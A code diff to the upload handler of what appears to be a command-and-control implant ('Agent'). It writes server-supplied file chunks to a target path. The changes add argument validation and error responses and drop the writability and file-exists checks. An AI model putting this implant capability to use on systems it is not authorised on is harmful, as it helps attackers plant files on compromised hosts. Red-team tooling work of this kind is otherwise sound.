@@ -4,6 +4,9 @@ using Agent.Models;
 using Agent.Utilities;
 using System.Collections.Concurrent;
 using System.Diagnostics;
+using System.IO;
+using System.Text.Json;
+using upload;
 
 namespace Agent
 {
@@ -27,41 +30,38 @@ namespace Agent
         public async Task Execute(ServerJob job)
         {
             ServerUploadJob uploadJob = new ServerUploadJob(job, this.config.chunk_size);
-            Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
-            uploadJob.path = uploadParams["remote_path"];
-            if (uploadParams.ContainsKey("host") && !string.IsNullOrEmpty(uploadParams["host"]))
+            UploadArgs args = JsonSerializer.Deserialize<UploadArgs>(job.task.parameters);
+            //Dictionary<string, string> uploadParams = Misc.ConvertJsonStringToDict(job.task.parameters);
+            string message = string.Empty;
+            if (args is null || !args.Validate(out message))
             {
-                if (!uploadParams["remote_path"].Contains(":") && !uploadParams["remote_path"].StartsWith("\\\\")) //It's not a local path, and it's not already in UNC format
+                await messageManager.AddResponse(new DownloadResponse
                 {
-                    uploadJob.path = @"\\" + uploadParams["host"] + @"\" + uploadParams["remote_path"];
-                }
-            }
-            if (uploadParams.ContainsKey("chunk_size") && !string.IsNullOrEmpty(uploadParams["chunk_size"]))
-            {
-                try
-                {
-                    uploadJob.chunk_size = int.Parse(uploadParams["chunk_size"]);
-                }
-                catch { }
+                    status = "error",
+                    process_response = new Dictionary<string, string> { { "message", message } },
+                    completed = true,
+                    task_id = job.task.id
+                }.ToJson());
+                return;
             }
 
-            uploadJob.file_id = uploadParams["file"];
+
+            uploadJob.path = args.path;
+            uploadJob.file_id = args.file;
             uploadJob.task = job.task;
             uploadJob.chunk_num = 1;
 
-            if (!CanWriteToFolder(uploadJob.path))
+            if(!uploadJobs.TryAdd(job.task.id, uploadJob))
             {
-                await messageManager.Write("Folder is not writeable", job.task.id, true, "error");
+                await messageManager.AddResponse(new DownloadResponse
+                {
+                    status = "error",
+                    user_output = "failed to add job to tracker",
+                    completed = true,
+                    task_id = job.task.id
+                }.ToJson());
                 return;
             }
-
-            if (File.Exists(uploadJob.path))
-            {
-                await messageManager.Write("File already exists.", job.task.id, true, "error");
-                return;
-            }
-
-            uploadJobs.GetOrAdd(job.task.id, uploadJob);
 
             await messageManager.AddResponse(new UploadResponse
             {
@@ -80,13 +80,45 @@ namespace Agent
         {
             ServerUploadJob uploadJob = this.GetJob(response.task_id);
 
+            if(uploadJob is null)
+            {
+                await messageManager.AddResponse(new ResponseResult
+                {
+                    status = "error",
+                    completed = true,
+                    task_id = response.task_id,
+                    user_output = "Failed to get job",
+                }.ToJson());
+                return;
+            }
+
             if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
+                await messageManager.AddResponse(new ResponseResult
+                {
+                    status = "error",
+                    completed = true,
+                    task_id = response.task_id,
+                    user_output = "Cancellation Requested",
+                }.ToJson());
                 this.CompleteUploadJob(response.task_id);
+                return;
             }
 
             if (uploadJob.total_chunks == 0)
             {
+                if(response.total_chunks == 0)
+                {
+                    await messageManager.AddResponse(new ResponseResult
+                    {
+                        status = "error",
+                        completed = true,
+                        task_id = response.task_id,
+                        user_output = "Failed to get number of chunks",
+                    }.ToJson());
+                    return;
+                }
+
                 uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
             }
 
@@ -103,8 +135,15 @@ namespace Agent
                 return;
             }
 
-            if(!await this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
+            if(!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
             {
+                await messageManager.AddResponse(new ResponseResult
+                {
+                    status = "error",
+                    completed = true,
+                    task_id = response.task_id,
+                    user_output = "Failed to process message.",
+                }.ToJson());
                 this.CompleteUploadJob(response.task_id);
                 return;
             }
@@ -123,6 +162,7 @@ namespace Agent
                     full_path = uploadJob.path
                 }
             };
+
             if (response.chunk_num == uploadJob.total_chunks)
             {
                 ur = new UploadResponse()
@@ -157,17 +197,27 @@ namespace Agent
         /// Read the next chunk from the file
         /// </summary>
         /// <param name="job">Download job that's being tracked</param>
-        private async Task<bool> HandleNextChunk(byte[] bytes, string job_id)
+        private bool HandleNextChunk(byte[] bytes, string job_id)
         {
             ServerUploadJob job = uploadJobs[job_id];
             try
             {
-                await Misc.AppendAllBytes(job.path, bytes);
+                using (var stream = new FileStream(job.path, FileMode.Append))
+                {
+                    try
+                    {
+                        stream.Write(bytes, 0, bytes.Length);
+                    }
+                    catch (Exception e)
+                    {
+                        this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
+                    }
+                }
                 return true;
             }
             catch (Exception e)
             {
-                await this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
+                this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
                 return false;
             }
         }
@@ -179,36 +229,5 @@ namespace Agent
         {
             return uploadJobs[task_id];
         }
-
-        private bool CanWriteToFolder(string folderPath)
-        {
-            try
-            {
-                var directory = Path.GetDirectoryName(folderPath);
-                // Check if the folder exists
-                if (Directory.Exists(directory))
-                {
-                    // Try to create a temporary file in the folder
-                    string tempFilePath = Path.Combine(directory, Path.GetRandomFileName());
-                    using (FileStream fs = File.Create(tempFilePath)) { }
-
-                    // If successful, delete the temporary file
-                    File.Delete(tempFilePath);
-
-                    return true;
-                }
-                else
-                {
-                    return false;
-                }
-            }
-            catch (Exception ep)
-            {
-                // An exception occurred, indicating that writing to the folder is not possible
-                return false;
-            }
-        }
-
-
     }
 }
